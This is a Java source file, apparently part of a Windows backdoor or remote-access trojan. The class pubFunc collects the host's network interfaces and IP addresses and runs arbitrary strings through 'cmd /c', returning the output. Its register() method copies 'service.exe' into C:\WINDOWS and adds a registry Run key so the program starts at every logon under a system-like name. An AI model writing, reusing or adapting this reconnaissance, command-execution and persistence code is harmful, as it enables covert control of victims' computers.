package com.dsc.publicmethod;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import org.apache.commons.io.FileUtils;

public class pubFunc {
	public String getIP() {
		String ipString = "";
		Enumeration<NetworkInterface> netInterfaces = null;
		try {
			netInterfaces = NetworkInterface.getNetworkInterfaces();
			while (netInterfaces.hasMoreElements()) {
				NetworkInterface ni = netInterfaces.nextElement();
				ipString = ipString + ni.getDisplayName() + "\n";
				ipString = ipString + ni.getName() + "\n";
				Enumeration<InetAddress> ips = ni.getInetAddresses();
				while (ips.hasMoreElements()) {
					ipString = ipString + ips.nextElement().getHostAddress() + "\n";
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return ipString;
	}

	public String dosExe(String dosString) {
		Process process;
		Runtime rumtime = Runtime.getRuntime();
		DataOutputStream dos;
		String command = "cmd /c " + dosString;
		BufferedReader bufferedReader;
		String big5String = null;
		String utf8String = "Command is failed";
		try {
			process = rumtime.exec(command);
			bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "big5"));
			// dos.writeUTF("1start");
			String tmp = null;
			while ((big5String = bufferedReader.readLine()) != null) {
				tmp = new String(big5String.getBytes(), "UTF-8");
				utf8String="";
				if(tmp!=null&&!"".equals(tmp)){
					utf8String+=tmp+"\n";
				}
				// dos.writeUTF(s);
			}
			// dos.writeUTF("1end");
		} catch (IOException e) {
			e.printStackTrace();
		}
		return utf8String;
	}

	public String getJarName(Class instance) {
		String path = instance.getProtectionDomain().getCodeSource().getLocation().getFile();
		return path;
	}

	public void register() {
		String path = System.getProperty("user.dir");
		String sep = System.getProperty("file.separator");
		String dir = "C:" + sep + "WINDOWS";
		String name = "service.exe";
		String src=path + sep + name;
		String des= dir + sep + name;
		System.out.println("src:"+src);
		System.out.println("des:"+des);
		if (!path.equalsIgnoreCase(dir)) {
			// new App().start();
			try {
				File srcFile = new File(src);
				File destFile = new File(des);
				FileUtils.copyFile(srcFile, destFile);
			} catch (Exception e) {
				e.printStackTrace();
			}
			String key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
			String value = des;
			String command = "reg add " + key + " /v " + name + " /d " + value;
			try {
				Runtime.getRuntime().exec(command+"& exit");
			} catch (IOException e) {
				e.printStackTrace();
			}

		}
	}
}
